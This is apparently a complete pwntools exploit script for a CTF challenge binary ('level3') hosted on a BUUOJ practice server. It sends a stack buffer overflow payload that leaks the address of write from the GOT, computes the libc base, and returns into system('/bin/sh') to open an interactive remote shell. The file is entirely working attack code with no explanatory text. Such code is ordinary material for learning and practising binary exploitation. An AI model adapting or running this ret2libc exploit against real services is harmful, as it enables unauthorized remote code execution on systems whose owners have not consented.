from pwn import *
context(log_level='debug')
#io = process("./level3")
io = remote("node3.buuoj.cn",28043)
elf = ELF("./level3")
libc = ELF("./libc-2.23.so")
write_plt = elf.sym['write']
fun_add = 0x0804844B
write_got = elf.got['write']
payload = 'a'*0x88 +'bbbb' + p32(write_plt) + p32(fun_add) + p32(1)+ p32(write_got)  + p32(4)
io.recv()
io.sendline(payload)
write_add = u32(io.recv(4))
print hex(write_add)
io.recvuntil("Input:\n")
base = write_add - libc.sym['write']
sys_add = base + libc.sym['system']
bin_sh = base + libc.search('/bin/sh').next()
payload = 'a'*0x88 +'bbbb' + p32(sys_add) +p32(0x10086110) + p32(bin_sh)
io.sendline(payload)
io.interactive()